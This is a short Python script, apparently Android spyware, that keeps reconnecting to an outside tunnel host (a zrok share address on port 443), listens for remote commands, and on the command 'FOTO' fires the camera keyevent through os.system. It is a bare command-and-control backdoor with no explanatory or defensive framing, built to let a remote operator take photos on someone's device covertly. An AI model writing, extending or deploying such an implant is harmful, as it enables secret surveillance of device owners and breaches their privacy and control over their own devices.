import socket, os, time
def iniciar():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("jkfh48jrpdys.share.zrok.io", 443))
            while True:
                comando = s.recv(1024).decode()
                if "FOTO" in comando:
                    os.system("input keyevent 27") 
                if not comando: break
            s.close()
        except: 
            time.sleep(5)
iniciar()
                  
